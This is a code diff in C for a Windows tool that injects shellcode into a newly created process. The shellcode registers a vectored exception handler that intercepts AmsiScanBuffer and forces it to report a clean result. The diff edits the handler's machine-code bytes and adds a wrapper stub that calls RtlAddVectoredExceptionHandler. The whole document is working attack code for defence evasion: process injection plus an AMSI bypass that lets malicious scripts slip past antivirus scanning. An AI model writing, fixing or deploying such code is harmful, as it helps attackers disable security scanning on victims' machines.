@@ -86,8 +86,8 @@ int main(int argc, char** argv) {
     unsigned char vehStub[] = {
         0x48, 0x8B, 0x51, 0x08,                                         // mov rdx, [rcx + 8] (rdx = ContextRecord)
         0x48, 0x8B, 0x82, 0xF8, 0x00, 0x00, 0x00,                       // mov rax, [rdx + 0xF8] (rax = RIP)
-        0x48, 0xBC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov r12, [AmsiScanBufferAddr] (Placeholder offset 13)
-        0x4C, 0x39, 0xE0,                                               // cmp rax, r12
+        0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov r11, [AmsiScanBufferAddr] (Placeholder offset 13)
+        0x4C, 0x39, 0xD8,                                               // cmp rax, r11
         0x75, 0x1A,                                                     // jne skip
         0x48, 0xC7, 0x82, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov [rdx + 0x78], 0 (RAX = 0)
         0x48, 0x8B, 0x82, 0x98, 0x00, 0x00, 0x00,                       // mov rax, [rdx + 0x98] (rax = RSP)
@@ -107,16 +107,25 @@ int main(int argc, char** argv) {
     WriteProcessMemory(Pi.hProcess, pRemoteHandler, vehStub, sizeof(vehStub), NULL);
 
     PVOID pAddVEH = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAddVectoredExceptionHandler");
+    unsigned char wrapperStub[] = {
+        0x48, 0xC7, 0xC1, 0x01, 0x00, 0x00, 0x00, // mov rcx, 1 (First = TRUE)
+        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdx, [pRemoteHandler] (offset 9)
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, [RtlAddVEH] (offset 19)
+        0x48, 0x83, 0xEC, 0x28,                   // sub rsp, 40 (Shadow space + alignement)
+        0xFF, 0xD0,                               // call rax
+        0x48, 0x83, 0xC4, 0x28,                   // add rsp, 40
+        0xC3                                      // ret
+    };
+
     // Pass pRemoteHandler as an argument (RDX/RCX depending on the call)
     // Note: RtlAddVectoredExceptionHandler(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler)
     // Here we register the handler in the first position (First = 1)
     HANDLE hThread = CreateRemoteThread(Pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddVEH, pRemoteHandler, 0, NULL);
 
     if (hThread) {
-            WaitForSingleObject(hThread, INFINITE);
-            CloseHandle(hThread);
-            return TRUE;
-        }
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+    }
 
     ResumeThread(Pi.hThread);
     Sleep(2);
